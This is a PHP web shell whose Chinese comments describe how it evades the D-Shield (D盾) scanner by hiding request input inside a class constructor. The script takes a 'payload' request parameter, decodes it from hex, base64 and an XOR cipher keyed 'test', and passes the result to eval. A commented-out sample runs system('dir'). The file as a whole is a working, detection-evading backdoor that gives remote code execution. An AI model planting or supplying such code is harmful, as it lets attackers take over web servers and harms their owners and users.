<?php
/**
 * 字符串异或加密算法
 * @param $string string 需要异或加密的内容
 * @param $key string 异或加密的key
 * @return string
 */
function xor_encode($string, $key){
    $str_length = strlen($string);
    $key_length = strlen($key);
    $tmp = 0;
    $result = "";

    for($i = 0; $i < $str_length; $i++){
        /**
         * 逐位异或并累加
         */
        $xor_char = $string[$i] ^ $key[$tmp];
        $result = $result . $xor_char;

        /**
         * 超过长度则将key索引置零，开启下一轮循环
         */
        if($tmp+1 < $key_length){
            $tmp++;
        }else{
            $tmp = 0;
        }

    }

    return $result;
}

/**
 * Class d_bypass
 * 过D盾php马，D盾对类查杀较弱，利用构造函数实现绕过
 */
class d_bypass{

    /**
     * @var mixed 构造一个公共变量用以接收request参数
     */
    public $payload;

    /**
     * d_bypass constructor.
     * 构造函数在对象实例化时执行
     */
    function __construct(){
        @$this->payload=$_REQUEST['payload'];
        //@$this->payload=$_COOKIE['user_token'];
    }
}

/**
 * 创建一个变量用以接收实例化的对象
 * 并取得对象的属性$payload
 */
$payload_class=new d_bypass();
$payload_class=$payload_class->payload;

//$payload_class="427877414142454957314d51444146545856343d";    // system('dir');

$payload_class = hex2bin($payload_class);
$payload_class = base64_decode($payload_class);
$payload_class = xor_encode($payload_class, "test");
//print_r($payload_class);
/**
 * shell_response用以接收eval执行结果
 */
eval($payload_class);